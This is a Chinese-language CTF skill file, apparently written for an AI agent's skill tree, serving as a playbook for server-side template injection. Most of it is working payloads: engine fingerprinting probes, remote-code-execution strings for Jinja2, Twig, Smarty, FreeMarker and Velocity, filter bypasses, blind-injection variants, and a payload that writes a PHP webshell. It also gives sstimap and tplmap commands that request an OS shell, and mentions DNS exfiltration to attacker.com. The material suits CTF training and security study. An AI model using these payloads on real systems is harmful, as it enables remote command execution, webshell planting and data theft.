---
name: ctf-web-ssti
description: CTF SSTI 模板注入 攻击 playbook。识别/触发词：SSTI/模板注入/template injection/{{7*7}}/${7*7}/<%=7*7%>/Jinja2/Twig/Smarty/FreeMarker/Velocity/PEP。碰到这些指纹时由二级 ctf-web 路由表调用本 leaf，专项解决"这个考点怎么打"。覆盖探测 payload、引擎指纹判定、各框架 RCE/文件读 payload、盲 SSTI、常用工具。
---

# CTF SSTI 模板注入 解题 playbook

> **定位**：CTF skill 树三级 leaf（知识锚点）。由二级 `ctf-web` 路由表按识别特征调用；本文件只讲"这个考点怎么打"，不重复工作流。
> **CTF 原则**：拿 flag 即止、不写修复、不臆想、区分确认与推测。靶机常不出网 → 优先本地回显路径（error/union/文件读），OOB 回连在 CTF 常用不上。

## 识别特征（什么时候调我）
- 用户输入被原样拼进模板渲染：参数值出现在页面，改 `{{7*7}}` 回显 `49`、`${7*7}` 回显 `49`、`<%=7*7%>` 回显 `49`。
- 输入框/URL 参数渲染成 HTML 后又出现在响应里，且服务端框架是 Flask/Jinja2、PHP/Twig/Smarty、Java/FreeMarker/Velocity、Ruby/ERB、Node/Pug/EJS。
- 报错页直接泄露引擎名：`UndefinedError`、`Twig_Error_Syntax`、`Smarty Exception`、`FreeMarker Template Error`、`TemplateEngine`。
- 经典探测序列：`{{7*7}}` → `49` 确认表达式；`{{7*'7'}}` → `7777777`（Jinja2/Python）vs `49`（Twig/PHP）做语言/引擎二分。
- 盲 SSTI：不回显，但 `{{42*42}}` 与 `{{42*42-1}}` 的响应长度/时间差异、或触发异常页面不同。

## 核心攻击手法

### 0. 探测 + 引擎指纹
```
# 通用表达式探测
{{7*7}}      # 49 => 表达式被求值
${7*7}       # 49 => Java EL / FreeMarker / Mako
<%= 7*7 %>   # 49 => ERB / EJS
#{7*7}       # Ruby interpolation / Smarty

# 引擎二分
{{7*'7'}}    # 7777777 => Jinja2/Python ；49 => Twig/PHP
{{7*7}} 在 PHP(Twig/Smarty) 中得 49，在 Java(FreeMarker) 中得 49，配合报错与标签语法区分
```

### 1. Jinja2 / Flask（Python，CTF 最常见）
```
# 确认
{{ config }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}      # 找 Popen / os._wrap_close 索引

# 经典 RCE（读 flag）
{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}
{{ request.application.__self__._get_data_for_json.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read() }}

# 过滤绕过常见手法
{{ ''['__cl''ass__'] }}                 # 关键词被过滤时字符串拼接
{{ ()|attr('__class__') }}              # attr 过滤器绕过点号过滤
{{lipsum.__globals__['os'].popen('id').read()}}   # lipsum 全局
```

### 2. Twig（PHP）
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
{{['cat /flag']|filter('system')}}
{{'/flag'|file_excerpt(0,100)}}         # 文件读
```

### 3. Smarty（PHP）
```
{system('cat /flag')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?passthru("cat /flag");?>')}
{if system('cat /flag')}{/if}            # {if} 标签，最通用
```

### 4. FreeMarker（Java）
```
<#assign cmd="cat /flag"?exec> ${cmd}
${"freemarker.template.utility.Execute"?new()("cat /flag")}
[#assign cmd="id"?exec]${cmd}            <!-- [] 语法绕过 < 拦截 -->
```

### 5. Velocity（Java）
```
#set($e="exp")#set($c=$e.getClass().forName("java.lang.Runtime"))#set($r=$c.getMethod("getRuntime",null).invoke(null,null))#set($p=$r.exec("cat /flag"))$p.waitFor()#set($b=$p.getInputStream())#set($x=$b.read())
```

### 6. 盲 SSTI（不回显 / 有过滤）
```
# 时间盲注：命令耗时回显
{{ (lipsum.__globals__.os.popen('sleep 3').read()) }}    # 响应延迟 3s => 命中
# 文件存在性盲注
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('cat /etc/passwd', shell=True, stderr=...).wait() }}
# 注：OOB(DNS exfil 到 attacker.com) CTF 靶机常不出网，优先上面的本地回显/盲注路径。
```

### 7. 上传/写马链路（当 RCE 被拦但能写文件）
```
# Jinja2 写 shell
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('/var/www/html/s.php','w').write('<?php system($_GET[0]);') }}
```

## CTF 实战结晶
（待积累，下次遇到本题型回填：题名 + 引擎 + 绕过 trick + payload + 链路）

## 工具命令
```bash
# 自动化利用（首选，覆盖 Jinja2/Twig/FreeMarker 等）
# tplmap 已较老但能跑；现代用 SSTImap
python3 -m pip install sstimap
python3 sstimap.py -u 'http://target/render?name=test' --engine jinja2

# 手工快速探测（curl）
curl -s 'http://target/?name={{7*7}}' | grep -i 49
curl -sG 'http://target/' --data-urlencode 'name={{7*7}}'

# tplmap（老牌，自动拿 RCE/OS Shell）
python2 tplmap.py -u 'http://target/?name=*' --os-shell

# 通用表达式 polyglot 探测（一次测多引擎）
{7*7}${7*7}<%=7*7%>{{7*7}}#{7*7}
```

## 深度参考（穷尽技巧时加载）
- hack-skills-main/skills/ssti-server-side-template-injection/SKILL.md

## 关联 leaf
- `ctf-web-lfi`：SSTI RCE 受限时，常用 LFI 直接读 `/flag`、读 `/proc/self/environ` 拿配置。
- `ctf-web-deser`：Java/Python 框架里 SSTI 常与反序列化链串联（FreeMarker/Velocity 触发 gadget）。
- `ctf-web-cmdi`：拿到模板 RCE 后等同命令执行，常需绕 `disable_functions`/沙箱，与命令注入技巧重叠。
